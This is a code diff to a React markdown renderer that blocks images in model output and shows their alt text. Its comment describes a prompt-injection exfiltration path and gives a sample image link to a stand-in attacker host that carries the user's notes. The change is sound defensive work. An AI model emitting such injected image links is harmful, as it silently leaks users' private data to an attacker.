@@ -51,6 +51,10 @@ const markdownComponents = {
       {children}
     </a>
   ),
+  // Never load images from model output: a prompt-injected document could
+  // make the model emit ![](https://attacker/?d=<your notes>), and the
+  // browser would fetch it — leaking data with zero clicks. Show alt text.
+  img: ({ alt }) => (alt ? <span>[image: {alt}]</span> : null),
 };
 
 function Markdown({ children }) {
